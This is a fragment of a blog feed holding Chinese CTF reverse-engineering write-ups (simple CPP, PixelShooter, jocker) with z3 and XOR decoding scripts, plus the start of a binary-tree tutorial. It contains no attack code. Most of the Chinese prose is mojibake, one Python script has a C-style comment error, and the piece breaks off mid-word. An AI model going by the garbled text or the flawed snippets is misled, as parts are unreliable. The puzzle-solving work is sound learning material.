        <content type="html"><![CDATA[<h1 id="ã€buuã€‘-GXYCTF2019-simple-CPP"><a href="#ã€buuã€‘-GXYCTF2019-simple-CPP" class="headerlink" title="ã€buuã€‘[GXYCTF2019]simple CPP"></a>ã€buuã€‘[GXYCTF2019]simple CPP</h1><hr><p>è¿™é¢˜ä¸»è¦æ˜¯åˆ†æå‡½æ•°ï¼Œå°±æ˜¯ CPP åç¼–è¯‘åçš„é‚£ä¸€å¨æœ‰ç‚¹ç»•</p><p>ä¹Ÿæ˜¯çœ‹äº†åˆ«çš„å¸ˆå‚…çš„ wp æ‰æ…¢æ…¢ç†è§£</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/put_in.png" alt="put_in"></p><p>è¿™é‡Œæ˜¯åŠ¨è°ƒåæ‰çŸ¥é“è¿™ä¸ªå‡½æ•°æ˜¯è¾“å…¥ï¼ŒæŠŠå‡½æ•°åå­—æ›´æ”¹æ›´å¥½ç†è§£</p><p>ä¸‹é¢çš„ if åˆ¤æ–­è¯­å¥ä¸­çš„ **v40 - 5 &gt; 25 **å·²ç»è¡¨æ˜äº†è¾“å…¥çš„å­—ç¬¦é•¿åº¦ä¸èƒ½è¶…è¿‡ <strong>30</strong></p><p>ç„¶åæ˜¯ä¸€æ®µæ„ä¹‰ä¸æ˜çš„å‡½æ•°æ®µ</p><hr><p>æ¥ç€åˆ°äº†è¿™é‡Œ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/xor_encry.png" alt="xor_encry"></p><p>è¿™é‡Œä¹Ÿæœ‰ä¸€äº›æ„ä¹‰ä¸æ˜</p><p>åŠ¨è°ƒå‘ç°ï¼Œv41 å’Œ qword_7FF7A0466060 éƒ½ç™¾å¹´æˆäº† 0x1F</p><p>æ‰€ä»¥ v9 çš„å€¼å°±æ˜¯è¾“å…¥çš„ flag</p><p>èµ°å®Œå¾ªç¯å v10 å°±å˜æˆäº† <strong>i_will_check_is_debug_or_not</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/v12.png" alt="v12"></p><p>v6 å°±æ˜¯è¾“å…¥çš„ flag å’Œ v10 è¿›è¡Œé€æ­¥å¼‚æˆ–</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/%E8%B5%8B%E5%80%BC.png" alt="èµ‹å€¼"></p><p>è¿™ä¹Ÿæ˜¯æœ‰ç‚¹æŠ½è±¡ v43 ä¸Šé¢å·²ç»è¯´äº†ä¸èƒ½è¶…è¿‡ 30</p><p>è€Œè¿™é‡Œç»™äº†ä¸ª <strong>if ( (int)v43 &gt; 30 )å’Œ if ( (int)v43 &lt;&#x3D; 0 )</strong></p><p>å¦åˆ™ä¼šå‰å¾€è¡¨ç¤º flag æ ¼å¼é”™è¯¯çš„è¯­å¥</p><p>çœ‹æ­£ç¡®æƒ…å†µä¸‹çš„èµ‹å€¼è¯­å¥ï¼Œè¿™é‡Œæ˜¯å°†è¾“å…¥çš„ flag æ¯ 8 ä½åˆ†æˆä¸€ç»„ï¼Œåˆ†åˆ«èµ‹å€¼ç»™ v14ï¼Œv13ï¼Œv12ï¼Œv11ï¼Œè¿™é‡Œ v11 åªæœ‰ 4 ä½å‰ä¸‰ä¸ªéƒ½æ˜¯ 8 ä½</p><p>ä¸‹é¢æœ‰ä¸€å°æ®µæ²¡æœ‰æˆªå›¾æˆªåˆ°</p><p>é‚£æ˜¯æŠŠ v14ï¼Œv13ï¼Œv12ï¼Œv11 åˆèµ‹å€¼ç»™ v18[0]ï¼Œv18[1]ï¼Œv18[2]ï¼Œv18[3]</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/%E8%B5%8B%E5%80%BC2%E4%B8%8E%E5%AF%86%E6%96%87.png" alt="èµ‹å€¼2ä¸å¯†æ–‡"></p><p>æ­£ç¡®çš„æƒ…å†µä¸‹æ˜¯ä¸ä¼šèµ° lable_27 çš„</p><p>æ‰€ä»¥åº”è¯¥æ˜¯èµ° lable_28</p><p>è¿™é‡Œæ˜¯ä¸€å¤§ä¸²èµ‹å€¼ä¸è¿ç®—æ“ä½œ</p><p>å…³é”®éƒ¨åˆ†æ˜¯é‚£å‡ ä¸ª if è¯­å¥</p><p>ç”¨ z3 çº¦æŸæ±‚è§£å™¨æŠŠ</p><p>æ±‚å®Œçš„å€¼æ‹¼èµ·æ¥è¿½æº¯åˆ°å¤´å°±æ˜¯ flag å’Œ v10 å¼‚æˆ–åçš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">v0 = BitVec(<span class="string">&#x27;v0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">v1 = BitVec(<span class="string">&#x27;v1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">v2 = BitVec(<span class="string">&#x27;v2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">v3 = BitVec(<span class="string">&#x27;v3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="comment">#æ·»åŠ çº¦æŸæ¡ä»¶</span></span><br><span class="line">s.add(v2 &amp; ~v0 == <span class="number">1176889593874</span>)</span><br><span class="line">s.add((v2 &amp; ~v1) &amp; v0 | v2 &amp; ((v1 &amp; v0) | v1 &amp; ~v0 | ~(v1 | v0)) == <span class="number">577031497978884115</span>)</span><br><span class="line">s.add((v2 &amp; ~v0) | (v1 &amp; v0) | (v2 &amp; ~v1) | (v0 &amp; ~v1) == <span class="number">4483974544037412639</span>)</span><br><span class="line">s.add(((v2 &amp; ~v0) | (v1 &amp; v0) | (v2 &amp; ~v1) | (v0 &amp; ~v1))^v3 == <span class="number">4483974543195470111</span>)</span><br><span class="line">s.add(((v2 &amp; ~v0) | (v1 &amp; v0) | v1 &amp; v2) == (~v0 &amp; v2 | <span class="number">864693332579200012</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰è§£</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰è§£ï¼Œæ‰“å°æ¨¡å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6666&quot;</span>)</span><br><span class="line">    <span class="comment"># print chr</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v0 =&quot;</span>, <span class="built_in">hex</span>(m[v0].as_long()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v1 =&quot;</span>, <span class="built_in">hex</span>(m[v1].as_long()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v2 =&quot;</span>, <span class="built_in">hex</span>(m[v2].as_long()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v3 =&quot;</span>, <span class="built_in">hex</span>(m[v3].as_long()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¼èµ·æ¥å’Œ v10 è¿›è¡Œå¼‚æˆ–å°±æ˜¯ flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x3e</span>,<span class="number">0x3a</span>,<span class="number">0x46</span>,<span class="number">0x05</span>,<span class="number">0x33</span>,<span class="number">0x28</span>,<span class="number">0x6f</span>,<span class="number">0x0d</span>,<span class="number">0xc</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x30</span>,<span class="number">0x08</span>,<span class="number">0x2c</span>,<span class="number">0x0c</span>,<span class="number">0x8</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x17</span>,<span class="number">0x15</span>,<span class="number">0x3e</span>,<span class="number">0x30</span>,<span class="number">0x13</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x06</span>,<span class="number">0x00</span>]</span><br><span class="line">v12 = <span class="string">&#x27;i_will_check_is_debug_or_not&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v12[i%<span class="number">27</span>]) ^ enc[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¨‹åºæ‰§è¡Œå®Œä¼šå‘ç°ä¸å¯¹</p><p>åŸé¢˜è¿™é‡Œç»™äº†æ®µ hint ç¬¬äºŒç»„æ•°æ®ä¸º e!P0or_aï¼Œä½†æ˜¯ buu æ²¡æœ‰ç»™</p><p>æ‰€ä»¥åªè¦æŠŠç›¸åº”éƒ¨ä½æ¢æˆ e!P0or_a å³å¯</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€unityé€†å‘ã€‘ã€å®‰å“reã€‘ã€buuã€‘[MRCTF2020]PixelShooter</title>
      <link href="/2024/07/29/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90%E5%AE%89%E5%8D%93re%E3%80%91%E3%80%90buu%E3%80%91%5BMRCTF2020%5DPixelShooter/"/>
      <url>/2024/07/29/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90%E5%AE%89%E5%8D%93re%E3%80%91%E3%80%90buu%E3%80%91%5BMRCTF2020%5DPixelShooter/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€unityé€†å‘ã€‘ã€å®‰å“reã€‘ã€buuã€‘-MRCTF2020-PixelShooter"><a href="#ã€unityé€†å‘ã€‘ã€å®‰å“reã€‘ã€buuã€‘-MRCTF2020-PixelShooter" class="headerlink" title="ã€unityé€†å‘ã€‘ã€å®‰å“reã€‘ã€buuã€‘[MRCTF2020]PixelShooter"></a>ã€unityé€†å‘ã€‘ã€å®‰å“reã€‘ã€buuã€‘[MRCTF2020]PixelShooter</h1><hr><p>è¿™é“é¢˜æ˜¯ä¸€ä¸ª<strong>å®‰å“çš„unityå°æ¸¸æˆé€†å‘</strong></p><p>å°†ä¸‹è½½çš„é¢˜ç›®å®‰è£…åŒ…æ‹–å…¥åˆ°jadxä¸­å¹¶æœªå‘ç°ä¸€äº›æœ‰ç”¨çš„å‡½æ•°</p><p>äºæ˜¯å°±æƒ³ç€æ˜¯ä¸æ˜¯libmain.soæœ‰ç›¸å…³å‡½æ•°</p><p>å°†libmainæ‹–å…¥åˆ°idaä¸­ä¹Ÿå¹¶æœªå‘ç°æœ‰ç”¨çš„å‡½æ•°</p><p>æƒ³åˆ°è¿™æ˜¯ä¸ªunityå°æ¸¸æˆï¼Œäºæ˜¯åˆæŠŠAssembly-CSsharp.dllæ‹–å…¥åˆ°ILspyä¸­</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BMRCTF2020%5DPixelShooter/ILspy.png" alt="ILspy"></p><p>æŸ¥çœ‹UserString Heapçš„å­—ç¬¦è¡¨å‘ç°äº†flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å¦ä¸€ç§smcã€‘ã€å¯¹äºtime()ä¸randçš„ä¸€ç§å¤„ç†æ–¹æ³•ã€‘ã€buuã€‘[ç½‘é¼æ¯ 2020 é’é¾™ç»„]jocker</title>
      <link href="/2024/07/24/%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8Dsmc%E3%80%91%E3%80%90%E5%AF%B9%E4%BA%8Etime()%E4%B8%8Erand%E7%9A%84%E4%B8%80%E7%A7%8D%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%E3%80%91%E3%80%90buu%E3%80%91%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker/"/>
      <url>/2024/07/24/%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8Dsmc%E3%80%91%E3%80%90%E5%AF%B9%E4%BA%8Etime()%E4%B8%8Erand%E7%9A%84%E4%B8%80%E7%A7%8D%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%E3%80%91%E3%80%90buu%E3%80%91%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å¦ä¸€ç§smcã€‘ã€å¯¹äºtime-ä¸randçš„ä¸€ç§å¤„ç†æ–¹æ³•ã€‘ã€buuã€‘-ç½‘é¼æ¯-2020-é’é¾™ç»„-jocker"><a href="#ã€å¦ä¸€ç§smcã€‘ã€å¯¹äºtime-ä¸randçš„ä¸€ç§å¤„ç†æ–¹æ³•ã€‘ã€buuã€‘-ç½‘é¼æ¯-2020-é’é¾™ç»„-jocker" class="headerlink" title="ã€å¦ä¸€ç§smcã€‘ã€å¯¹äºtime()ä¸randçš„ä¸€ç§å¤„ç†æ–¹æ³•ã€‘ã€buuã€‘[ç½‘é¼æ¯ 2020 é’é¾™ç»„]jocker"></a>ã€å¦ä¸€ç§smcã€‘ã€å¯¹äºtime()ä¸randçš„ä¸€ç§å¤„ç†æ–¹æ³•ã€‘ã€buuã€‘[ç½‘é¼æ¯ 2020 é’é¾™ç»„]jocker</h1><hr><p>è¿™æ¬¡çš„smcä¸åŒäºä¹‹å‰çš„é‚£é“ï¼Œè¿™æ¬¡çš„smcæ˜¯æœ‰åå­—çš„å’Œä¸€å®šç‰¹å¾è§£smcå‡½æ•°çš„</p><p>è€Œä¸æ˜¯æƒ³ä¸Šæ¬¡è¦åœ¨ä¸€ä¸ªå¤§æ®µä¸­å¯»æ‰¾æ’å…¥çš„å‡½æ•°</p><hr><p>æŸ¥å£³æ— å£³32ï¼Œida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/main.png" alt="main"></p><p>è¿™ä¸ªæ ˆå¹³è¡¡ä¸ä¼šå½±å“ç¨‹åºè°ƒè¯•ï¼Œå…ˆä¸ç®¡å®ƒ</p><p>è¿™é‡Œçš„encryptè·Ÿè¿›åæ˜¯æ²¡æœ‰ä¼ªä»£ç è€Œåªæœ‰æ±‡ç¼–ä»£ç ï¼Œè€Œä¸”æ±‡ç¼–ä»£ç ä¹Ÿæ˜¯éå¸¸çš„åŒªå¤·æ‰€æ€ï¼Œ</p><p>ä½†æ˜¯ä¸‹é¢æœ‰ä¸ª186æ¬¡å¾ªç¯æ˜¯æ¥è§£å®ƒçš„å˜æˆæ­£ç¡®çš„å‡½æ•°çš„smc</p><p>æ‰€ä»¥è¿™ä¸ªé¢˜æ˜¯è¦åŠ¨è°ƒ</p><p>å›åˆ°mainåœ¨forå¾ªç¯æ‰“ä¸ªæ–­ç‚¹</p><p>ç”±äºv7è¦ç­‰äº24ï¼Œæ‰€ä»¥è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º24çš„å­—ç¬¦ä¸²</p><p>ç„¶åä¼šåœ¨forå¾ªç¯å¤„åœä¸‹</p><p>Destinationæ˜¯æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²æœªç»å¤„ç†å¤åˆ¶è¿‡å»</p><hr><p>åˆ‡åˆ°æ±‡ç¼–ç•Œé¢<img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/smc.png" alt="smc"></p><p>è¿™ä¸ªåœ°æ–¹å°±æ˜¯smc</p><p>è¿›è¡Œå®Œå¾ªç¯åä¼šåœåœ¨å·¦é¢çš„å—ä¸­ï¼Œè¿™æ—¶åœä¸‹ï¼Œå»è§£å¯†encryptä¸finally</p><p>æ³¨æ„æ‰¾å¥½ç¡¬ç¼–ç  <strong>55 89</strong> ï¼Œè¿™é‡Œä¼šæœ‰ä¸¤ç«¯å‡½æ•°ï¼Œencryptä¸‹é¢å°±æ˜¯finally</p><p>è¿™é‡Œè¦è§£å¯†2ä¸ªå‡½æ•°</p><hr><p>ç„¶åè¿›å…¥encrypt</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/enc.png" alt="enc"></p><p>è¿™é‡Œæ˜¯è¦è¦è®©è¾“å…¥çš„å­—ç¬¦å’Œbufferè¿›è¡Œå¼‚æˆ–ç­‰äº403040</p><p>å†™ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;hahahaha_do_you_find_me?&#x27;</span></span><br><span class="line"></span><br><span class="line">v21 = [<span class="number">14</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">88</span>, <span class="number">86</span>, <span class="number">62</span>, <span class="number">6</span>, <span class="number">12</span>,  <span class="number">60</span>, <span class="number">31</span>, <span class="number">87</span>, <span class="number">20</span>, <span class="number">107</span>, <span class="number">87</span>, <span class="number">89</span>, <span class="number">13</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    v21[j] ^= <span class="built_in">ord</span>(<span class="built_in">str</span>[j])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v21[j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œåå‘ç°flagè¿˜å°‘ä¸€éƒ¨åˆ†</p><hr><p>å›åˆ°mainè·Ÿè¿›finally</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/finally.png" alt="finally"></p><p>è¿™é‡Œæœ‰ä¸ªè·å–å½“æ—¶æ—¶é—´å’Œä¼ªéšæœºçš„å¤åˆ¶</p><p>è¿™ä¸ªifä¼šæœ‰ç‚¹åŒªå¤·æ‰€æ€ï¼Œä¸è¿‡æ ¹æ®encryptå¯çŸ¥è¿™ä¹Ÿå¯èƒ½æ˜¯è¦å¼‚æˆ–</p><p>é—®gptæ˜¯è¯´è¿™é‡Œifä¸­çš„ !&#x3D; åˆ¤æ–­å¯ä»¥è§†ä¸ºå¼‚æˆ–ï¼Œ</p><p>ä¹Ÿå°±æ˜¯è¯´ v3 ^ a1 &#x3D; v4</p><p>ä¸è¿‡æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¿™ä¸ªå¼‚æˆ–çš„å€¼</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€ä¸ªé€†è¿ç®—æ“ä½œæ¥æ±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;hahahaha_do_you_find_me?&#x27;</span></span><br><span class="line"></span><br><span class="line">str1 = [<span class="number">0X25</span>,<span class="number">0X74</span>,<span class="number">0X70</span>,<span class="number">0X26</span>,<span class="number">0X3A</span>]</span><br><span class="line">xor = <span class="number">0X3A</span> ^ <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>)//æ¥æ±‚å¼‚æˆ–çš„å€¼</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    str1[i] ^= xor</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(str1[i]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ ·æ±‚å‡ºäº†å‰©ä¸‹çš„flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€äºŒå‰æ ‘ã€‘ã€æ•°æ®ç»“æ„ã€‘ã€buuã€‘[GUET-CTF2019]number_game</title>
      <link href="/2024/07/23/%E3%80%90%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E3%80%90buu%E3%80%91%5BGUET-CTF2019%5Dnumber_game/"/>
      <url>/2024/07/23/%E3%80%90%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E3%80%90buu%E3%80%91%5BGUET-CTF2019%5Dnumber_game/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€äºŒå‰æ ‘ã€‘ã€æ•°æ®ç»“æ„ã€‘ã€buuã€‘-GUET-CTF2019-number-game"><a href="#ã€äºŒå‰æ ‘ã€‘ã€æ•°æ®ç»“æ„ã€‘ã€buuã€‘-GUET-CTF2019-number-game" class="headerlink" title="ã€äºŒå‰æ ‘ã€‘ã€æ•°æ®ç»“æ„ã€‘ã€buuã€‘[GUET-CTF2019]number_game"></a>ã€äºŒå‰æ ‘ã€‘ã€æ•°æ®ç»“æ„ã€‘ã€buuã€‘[GUET-CTF2019]number_game</h1><h2 id="ã€äºŒå‰æ ‘ã€‘"><a href="#ã€äºŒå‰æ ‘ã€‘" class="headerlink" title="ã€äºŒå‰æ ‘ã€‘"></a>ã€äºŒå‰æ ‘ã€‘</h2><hr><h3 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h3><p>[è¯¦ç»†å›¾è§£äºŒå‰æ ‘å››ç§éå†(å‰åºä¸­åºååºå±‚æ¬¡éå†)]<a href="https://blog.csdn.net/m0_68681879/article/details/127847415?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172170617216800178534776%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172170617216800178534776&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127847415-null-null.142">https://blog.csdn.net/m0_68681879/article/details/127847415?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172170617216800178534776%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172170617216800178534776&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127847415-null-null.142</a></p><p>[äºŒå‰æ ‘éå†çš„å®ç°ï¼ˆè¶…è¯¦ç»†è§£æï¼Œå°ç™½å¿…çœ‹ç³»åˆ—ï¼‰]<a href="https://blog.csdn.net/weixin_45031801/article/details/133747485?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172171563016800182746442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-133747485-null-null.142">https://blog.csdn.net/weixin_45031801/article/details/133747485?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172171563016800182746442&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-133747485-null-null.142</a></p><p>[æ•°æ®ç»“æ„â€”â€”é¡ºåºé˜Ÿåˆ—ä¸é“¾å¼é˜Ÿåˆ—çš„å®ç°]<a href="https://blog.csdn.net/m0_74712453/article/details/135351817?spm=1001.2014.3001.5502">https://blog.csdn.net/m0_74712453/article/details/135351817?spm=1001.2014.3001.5502</a></p><p>[æ•°æ®ç»“æ„â€”â€”äºŒå‰æ ‘å››ç§éå†çš„å®ç°]<a href="https://blog.csdn.net/m0_74712453/article/details/135360309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172171563016800182746442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-135360309-null-null.142">https://blog.csdn.net/m0_74712453/article/details/135360309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172171563016800182746442&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-135360309-null-null.142</a></p><p>[ä¸œå“¥å¸¦ä½ åˆ·äºŒå‰æ ‘ï¼ˆçº²é¢†ç¯‡ï¼‰]<a href="https://labuladong.online/algo/essential-technique/binary-tree-summary/">https://labuladong.online/algo/essential-technique/binary-tree-summary/</a></p><hr><h3 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h3><h4 id="ä¸€ã€æ ‘çš„æ¦‚å¿µ"><a href="#ä¸€ã€æ ‘çš„æ¦‚å¿µ" class="headerlink" title="ä¸€ã€æ ‘çš„æ¦‚å¿µ"></a>ä¸€ã€æ ‘çš„æ¦‚å¿µ</h4><h5 id="1ã€æ ‘çš„å®šä¹‰"><a href="#1ã€æ ‘çš„å®šä¹‰" class="headerlink" title="1ã€æ ‘çš„å®šä¹‰"></a>1ã€æ ‘çš„å®šä¹‰</h5><p>1ï¼‰æ ‘<br>â€ƒâ€ƒæ ‘æ˜¯ n(nâ‰¥0) ä¸ªç»“ç‚¹çš„æœ‰é™é›†åˆã€‚å½“ n&gt;0 æ—¶ï¼Œå®ƒæ˜¯ä¸€æ£µéç©ºæ ‘ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š<br>â€ƒâ€ƒâ€ƒâ€ƒ1ï¼‰æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªç‰¹å®šçš„ç»“ç‚¹ï¼Œç§°ä¸ºæ ¹ç»“ç‚¹Rootï¼›<br>â€ƒâ€ƒâ€ƒâ€ƒ2ï¼‰é™¤æ ¹ç»“ç‚¹å¤–ï¼Œå…¶ä½™ç»“ç‚¹åˆ†ä¸º m ä¸ªäº’ä¸ç›¸äº¤çš„æœ‰é™é›†åˆ T1ã€T2ã€â€¦â€¦â€¦â€¦ã€Tmï¼Œå…¶ä¸­æ¯ä¸€ä¸ª Ti(1â‰¤iâ‰¤m) åˆæ˜¯ä¸€æ£µæ ‘ï¼Œå¹¶ä¸”ä¸ºæ ¹ç»“ç‚¹ Root çš„å­æ ‘ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œä»£è¡¨çš„æ˜¯ä¸€æ£µä»¥ a ä¸ºæ ¹ç»“ç‚¹çš„æ ‘ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/tree.png" alt="tree"></p><p>2ï¼‰ç©ºæ ‘<br>â€ƒâ€ƒå½“ n&#x3D;0ï¼Œä¹Ÿå°±æ˜¯ 0 ä¸ªç»“ç‚¹çš„æƒ…å†µä¹Ÿæ˜¯æ ‘ï¼Œå®ƒè¢«ç§°ä¸ºç©ºæ ‘ã€‚</p><p>3ï¼‰å­æ ‘<br>â€ƒâ€ƒæ ‘çš„å®šä¹‰ç”¨åˆ°äº†é€’å½’çš„æ€æƒ³ã€‚å³æ ‘çš„å®šä¹‰ä¸­è¿˜æ˜¯ç”¨åˆ°äº†æ ‘çš„æ¦‚å¿µï¼Œå¦‚å›¾æ‰€ç¤ºï¼ŒT1 å’Œ T2 å°±æ˜¯ç»“ç‚¹ a çš„å­æ ‘ã€‚ç»“ç‚¹ dã€gã€hã€i ç»„æˆçš„æ ‘åˆæ˜¯ç»“ç‚¹ b çš„å­æ ‘ç­‰ç­‰ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/kidTree.png" alt="kidTree"></p><p>â€ƒâ€ƒå­æ 